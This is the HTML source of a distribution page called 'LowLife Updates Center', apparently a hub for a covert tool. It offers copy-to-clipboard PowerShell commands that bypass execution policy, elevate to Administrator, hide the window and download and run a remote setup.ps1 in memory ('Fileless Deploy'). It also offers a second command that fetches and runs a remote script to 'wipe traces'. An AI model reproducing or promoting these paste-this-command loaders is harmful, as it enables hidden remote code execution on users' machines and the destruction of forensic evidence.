<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LowLife Updates Center</title>
    <link rel="stylesheet" href="style.css?v=2">
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="status-badge">
                <span class="status-dot"></span>
                System Node: Online
            </div>
            <h1 class="logo-title">LOWLIFE</h1>
            <div class="subtitle">Secure Distribution Hub</div>
        </div>

        <div class="panel">
            <div class="panel-title">
                <span class="panel-title-icon">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><line x1="9" y1="9" x2="15" y2="9"></line><line x1="9" y1="13" x2="15" y2="13"></line><line x1="9" y1="17" x2="11" y2="17"></line></svg>
                </span>
                Active Telemetry & Release Logs
            </div>
            
            <div class="stats-grid">
                <div class="stat-card active-version">
                    <div class="stat-val" id="lbl-version">-.-.-</div>
                    <div class="stat-lbl">Active Version</div>
                </div>
                <div class="stat-card total-downloads">
                    <div class="stat-val" id="lbl-downloads">0</div>
                    <div class="stat-lbl">Downloads</div>
                </div>
            </div>

            <div class="input-group">
                <label>Release Timestamp</label>
                <div class="text-input" id="lbl-date" style="display: flex; align-items: center; background: rgba(0,0,0,0.25);" readonly>-</div>
            </div>

            <div class="input-group" style="margin-bottom: 5px;">
                <label>Changelog Details</label>
                <div class="changelog-box" id="lbl-changelog">
                    Loading update logs...
                </div>
            </div>
        </div>

        <div class="panel" style="margin-bottom: 20px;">
            <div class="panel-title">
                <span class="panel-title-icon">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
                </span>
                Fileless Deploy Command
            </div>
            <label>Run this command once in PowerShell (as Administrator) to load:</label>
            <div class="command-block">
                <input type="text" id="powershell-cmd" class="text-input" readonly value="powershell -ExecutionPolicy Bypass -Command &quot;Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -WindowStyle Hidden -Command &amp; { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (New-Object Net.WebClient).DownloadString(''__HOST_URL__/setup.ps1'') }' -Verb RunAs&quot;">
                <button id="btn-copy" class="btn-inline-copy">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
                    Copy
                </button>
            </div>
        </div>

        <div class="panel" style="margin-bottom: 25px;">
            <div class="panel-title">
                <span class="panel-title-icon" style="color: var(--accent-rose);">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
                </span>
                Stealth Trace Cleanup Command
            </div>
            <label>Run this command once in PowerShell (as Administrator) to wipe traces:</label>
            <div class="command-block" style="border-color: rgba(244, 63, 94, 0.25);">
                <input type="text" id="cleanup-cmd" class="text-input" readonly value="powershell -ExecutionPolicy Bypass -Command &quot;Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -Command &amp; { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (New-Object Net.WebClient).DownloadString(''__HOST_URL__/cleanup'') }' -Verb RunAs&quot;">
                <button id="btn-copy-cleanup" class="btn-inline-copy">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
                    Copy
                </button>
            </div>
        </div>

        <a href="/download" class="btn btn-primary" id="btn-download" style="text-decoration: none; margin-bottom: 10px;">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
            Download Setup Script (setup.ps1)
        </a>
    </div>

    <script>
        const lblVersion = document.getElementById('lbl-version');
        const lblDownloads = document.getElementById('lbl-downloads');
        const lblDate = document.getElementById('lbl-date');
        const lblChangelog = document.getElementById('lbl-changelog');
        const btnDownload = document.getElementById('btn-download');
        const powershellCmd = document.getElementById('powershell-cmd');
        const btnCopy = document.getElementById('btn-copy');
        const cleanupCmd = document.getElementById('cleanup-cmd');
        const btnCopyCleanup = document.getElementById('btn-copy-cleanup');

        // Determine whether we are hosted statically on GitHub Pages or locally
        const isGitHubPages = window.location.hostname.endsWith('github.io') || window.location.pathname.includes('/lowlife');
        let fileBaseUrl = window.location.origin;
        let apiVersionUrl = '/api/release/latest';
        let setupUrl = window.location.origin + '/setup.ps1';
        let cleanupUrl = window.location.origin + '/cleanup';
        let downloadButtonUrl = '/download';

        if (isGitHubPages) {
            // Static hosting mode
            fileBaseUrl += '/lowlife/files';
            apiVersionUrl = fileBaseUrl + '/releases.json';
            setupUrl = fileBaseUrl + '/setup.ps1';
            cleanupUrl = fileBaseUrl + '/cleanup.ps1';
            downloadButtonUrl = fileBaseUrl + '/setup.ps1';
        }

        // Set the download button link
        btnDownload.setAttribute('href', downloadButtonUrl);

        // Dynamically replace the hosted IP/domain in the PowerShell one-liners
        powershellCmd.value = powershellCmd.value.replace('__HOST_URL__/setup.ps1', setupUrl);
        cleanupCmd.value = cleanupCmd.value.replace('__HOST_URL__/cleanup', cleanupUrl);

        // Copy button handler (Installation)
        btnCopy.addEventListener('click', () => {
            powershellCmd.select();
            powershellCmd.setSelectionRange(0, 99999);
            navigator.clipboard.writeText(powershellCmd.value);
            
            btnCopy.classList.add('copied');
            btnCopy.innerHTML = `<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg> Copied`;
            setTimeout(() => {
                btnCopy.classList.remove('copied');
                btnCopy.innerHTML = `<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg> Copy`;
            }, 2000);
        });

        // Copy button handler (Cleanup)
        btnCopyCleanup.addEventListener('click', () => {
            cleanupCmd.select();
            cleanupCmd.setSelectionRange(0, 99999);
            navigator.clipboard.writeText(cleanupCmd.value);
            
            btnCopyCleanup.classList.add('copied');
            btnCopyCleanup.innerHTML = `<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg> Copied`;
            setTimeout(() => {
                btnCopyCleanup.classList.remove('copied');
                btnCopyCleanup.innerHTML = `<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg> Copy`;
            }, 2000);
        });

        async function fetchLatestRelease() {
            try {
                const response = await fetch(apiVersionUrl);
                const data = await response.json();
                
                let version, downloads, date, changelog;
                if (data.latestVersion !== undefined) {
                    version = data.latestVersion;
                    downloads = data.totalDownloads;
                    changelog = data.latestChangelog;
                    const lastHistory = data.history && data.history.length > 0 ? (data.history.find(h => h.version === data.latestVersion) || data.history[data.history.length - 1]) : null;
                    date = lastHistory ? lastHistory.date : '-';
                } else if (data.success) {
                    version = data.version;
                    downloads = data.totalDownloads;
                    date = data.date;
                    changelog = data.changelog;
                }

                if (version) {
                    lblVersion.textContent = `v${version}`;
                    lblDownloads.textContent = downloads.toLocaleString();
                    lblDate.textContent = date;
                    lblChangelog.textContent = changelog;
                } else {
                    lblChangelog.textContent = 'Failed to load details from the active update node.';
                }
            } catch (err) {
                lblChangelog.textContent = 'Failed to connect to the distribution service.';
            }
        }

        // Increase download counter visually on click to feel instant
        btnDownload.addEventListener('click', () => {
            setTimeout(() => {
                const cur = parseInt(lblDownloads.textContent.replace(/,/g, ''));
                if (!isNaN(cur)) {
                    lblDownloads.textContent = (cur + 1).toLocaleString();
                }
            }, 300);
        });

        fetchLatestRelease();
    </script>
</body>
</html>
